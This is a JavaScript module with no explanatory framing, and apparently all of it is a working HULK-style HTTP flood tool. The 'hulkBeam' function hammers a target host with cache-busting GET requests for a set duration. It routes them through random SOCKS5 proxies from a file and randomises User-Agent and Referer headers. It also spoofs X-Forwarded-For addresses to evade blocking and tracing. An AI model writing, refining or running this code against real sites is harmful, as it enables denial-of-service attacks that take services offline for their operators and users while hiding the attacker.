const axios   = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const fs      = require('fs');

const proxies = fs.readFileSync('./proxy.txt','utf8').split(/\r?\n/).filter(Boolean);
const randProxy = () => proxies[Math.floor(Math.random()*proxies.length)];
const randIP  = () => `${R(11,255)}.${R(0,255)}.${R(0,255)}.${R(2,254)}`;
const R = (min,max) => Math.floor(Math.random()*(max-min+1))+min;

const uaList = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12'+R(0,9)+'.0.'+R(1000,9999)+'.'+R(10,99)+' Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12'+R(0,9)+'.0.'+R(1000,9999)+'.'+R(10,99)+' Safari/537.36'
];
const refList = [
  'https://www.google.com/search?q=',
  'https://github.com/search?q=',
  'https://www.usatoday.com/search/results?q='
];

function buildBlock(size){
  let out = '';
  for(let i=0;i<size;i++) out += String.fromCharCode(65 + Math.floor(Math.random()*26));
  return out;
}

function hulkBeam(host, port, duration) {
  const end = Date.now() + duration*1000;
  const url = `https://${host}:${port}/`;
  let counter = 0;

  (async function run(){
    if(Date.now() > end) return;
    const agent = new SocksProxyAgent(`socks5://${randProxy()}`);
    const param = buildBlock(R(3,10)) + '=' + buildBlock(R(3,10));
    const fullUrl = url + (url.includes('?') ? '&' : '?') + param;

    try{
      await axios.get(fullUrl, {
        httpsAgent: agent,
        timeout: 4000,
        headers: {
          'User-Agent': uaList[Math.floor(Math.random()*uaList.length)],
          'Referer': refList[Math.floor(Math.random()*refList.length)] + buildBlock(5),
          'Cache-Control': 'no-cache',
          'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
          'Keep-Alive': `${R(110,120)}`,
          'Connection': 'keep-alive',
          'X-Forwarded-For': randIP()
        },
        validateStatus: ()=> true
      });
      counter++;
      if(counter % 100 === 0) console.log(`[HULK] ${counter} requests sent`);
    }catch{}

    setImmediate(run);
  })();
}

module.exports = { hulkBeam };